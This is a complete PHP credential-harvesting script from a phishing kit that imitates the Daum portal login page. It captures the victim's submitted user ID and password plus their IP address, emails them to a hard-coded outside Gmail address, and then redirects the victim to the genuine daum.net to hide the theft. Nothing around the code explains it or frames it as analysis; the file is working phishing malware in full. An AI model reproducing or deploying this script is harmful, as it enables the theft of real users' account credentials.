<?php 

error_reporting(0);

$ip = getenv("REMOTE_ADDR");

$message  = "==================+[ Daum Resultz ]+==================\n";
$message .= "login  : ".$_POST['userid']."\n";
$message .= "Passwd1 : ".$_POST['passwd']."\n\n";
$message .= "Client IP : ".$ip."\n";

$message .= "=============+[ Daum Resultz ]+=============\n";

$send= "Latinoworld0417@gmail.com";

$subject = "Login! | Daum Resultz | $ip";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);

header("Location:https://www.daum.net/");
?>